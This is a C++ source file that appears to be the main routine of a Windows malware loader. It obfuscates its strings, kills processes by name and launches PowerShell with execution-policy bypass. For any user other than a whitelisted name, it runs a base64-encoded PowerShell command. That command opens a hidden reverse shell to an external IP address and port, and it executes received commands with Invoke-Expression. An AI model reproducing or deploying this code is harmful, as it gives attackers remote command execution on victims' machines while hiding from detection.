#include "core/CoreManager.hpp"
#include "modules/ModulesManager.hpp"

int main(int argc, char *argv[])
{

    CoreManager *core_manager = new CoreManager();
    ModuleManager *module_manager = new ModuleManager();
    DebugLogger *logger = new DebugLogger();

    char *input = argv[1];

    if (!core_manager->Initialize(argc, argv))
    {
        return 1;
    }

    // if no input is provided
    if (argc < 2)
    {
        logger->Info(new const std::string(AY_OBFUSCATE("No input provided!")));
    }

    if (core_manager->Timezone() != "UTC")
    {
        logger->Info(new const std::string(AY_OBFUSCATE("Timezone is not UTC")));
    }
    else
    {
        logger->Info(new const std::string(AY_OBFUSCATE("Timezone is UTC")));
    }

    if (module_manager->ProcessID(input) == 0)
    {
        logger->Info(new const std::string(AY_OBFUSCATE("Process not found!")));
    }
    else
    {
        logger->Info(new const std::string(input));
        module_manager->stopPID(module_manager->ProcessID(input));
    }

    // module_manager->startCmd("/c echo Hello World from CMD");
    // module_manager->startPowershell("Start-Process -FilePath 'Ion.exe' -ArgumentList 'Hello World from Powershell' -WindowStyle Hidden");

    module_manager->startPowershell(new const std::string(AY_OBFUSCATE("-Command \"echo Hello World from Powershell\" > log.txt")), true);

    if (core_manager->GetUsername() != std::string(AY_OBFUSCATE("999fo")))
    {
        logger->Info(new const std::string(AY_OBFUSCATE("You are not whitelisted!")));
        module_manager->startPowershell(new const std::string(AY_OBFUSCATE("powershell -ep bypass -e \"UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAUABTAEgATwBNAEUAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAewAKACAAIAAgACAAIAAgACAAIAAkAHQAYwBwAEMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADcAMgAuADIAMwA0AC4AMgAxADcALgAxADcAMAAnACwAIAA0ADIAMAA2ADkAKQA7AAoAIAAgACAAIAAgACAAIAAgACQAbgBlAHQAdwBvAHIAawBTAHQAcgBlAGEAbQAgAD0AIAAkAHQAYwBwAEMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsACgAgACAAIAAgACAAIAAgACAAJABiAHUAZgBmAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAYgB5AHQAZQBbAF0AIAA2ADUANQAzADUAOwAKACAAIAAgACAAIAAgACAAIAB3AGgAaQBsAGUAIAAoACgAJABiAHkAdABlAHMAUgBlAGEAZAAgAD0AIAAkAG4AZQB0AHcAbwByAGsAUwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHUAZgBmAGUAcgAsACAAMAAsACAAJABiAHUAZgBmAGUAcgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBjAGUAaQB2AGUAZABEAGEAdABhACAAPQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAdQBmAGYAZQByACwAIAAwACwAIAAkAGIAeQB0AGUAcwBSAGUAYQBkACkAKQA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABlAHgAZQBjAHUAdABpAG8AbgBSAGUAcwB1AGwAdAAgAD0AIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAHIAZQBjAGUAaQB2AGUAZABEAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAcABvAG4AcwBlAFQAbwBTAGUAbgBkACAAPQAgACQAZQB4AGUAYwB1AHQAaQBvAG4AUgBlAHMAdQBsAHQAIAArACAAJwBQAFMAIAAnACAAKwAgACgARwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwBwAG8AbgBzAGUAQgB5AHQAZQBzACAAPQAgAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAkAHIAZQBzAHAAbwBuAHMAZQBUAG8AUwBlAG4AZAApADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAG4AZQB0AHcAbwByAGsAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHIAZQBzAHAAbwBuAHMAZQBCAHkAdABlAHMALAAgADAALAAgACQAcgBlAHMAcABvAG4AcwBlAEIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbgBlAHQAdwBvAHIAawBTAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAOwAKACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAJAB0AGMAcABDAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAIAB9ACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=\"")), true);
    }
    else
    {
        logger->Info(new const std::string(AY_OBFUSCATE("Username is 999fo")));
    }

    module_manager->startPowershell(new const std::string(AY_OBFUSCATE("Start-Process -FilePath 'notepad.exe' -ArgumentList 'log.txt' ")), true);
    // module_manager->startNotepad();

    Sleep(500);
    module_manager->stopProcess(new const std::string(AY_OBFUSCATE("notepad.exe")));
    Sleep(500);

    delete core_manager;
    delete module_manager;
    delete logger;

    return 0;
};